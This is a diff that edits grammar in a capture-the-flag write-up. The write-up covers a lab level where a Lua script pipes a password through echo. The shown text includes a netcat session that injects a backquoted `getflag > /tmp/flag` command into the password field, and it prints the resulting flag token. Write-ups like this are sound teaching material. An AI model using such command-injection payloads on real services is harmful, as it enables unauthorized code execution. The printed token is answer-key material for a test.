@@ -2,7 +2,7 @@
 
 ---
 
-This level is similar to previous levels but this time it's `.lua` file.
+This level is similar to previous levels but this time it's a `.lua` file.
 
 ```lua
 #!/usr/bin/env lua
@@ -41,20 +41,20 @@ while 1 do
 end
 ```
 
-In this level I don't have any hidden file or token file but we have `echo` command and our file is owned by flag11.
+In this level, I don't have any hidden file or token file but we have the `echo` command, and our file is owned by flag11.
 
-So I need to execute `getflag` through the command. Previously I saw that if I use back quotes `echo` can run the command inside and I will redirect the output of this command otherwise `level11` will redirect the output inside `sha1sum`.
+So, I need to execute `getflag` through the command. Previously, I saw that if I use back quotes `echo` can run the command inside and I will redirect the output of this command; otherwise, `level11` will redirect the output inside `sha1sum`.
 
 ```shell
 $ nc 127.0.0.1 5151
 Password: `getflag > /tmp/flag`
 Erf nope..
 $ cat /tmp/flag
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+Check flag. Here is your token: fa6v5ateaw21peobuub8ipe6s
 ```
 
 ---
 
-*Source :*
+*Source:*
 
 *https://linux.die.net/man/1/nc*
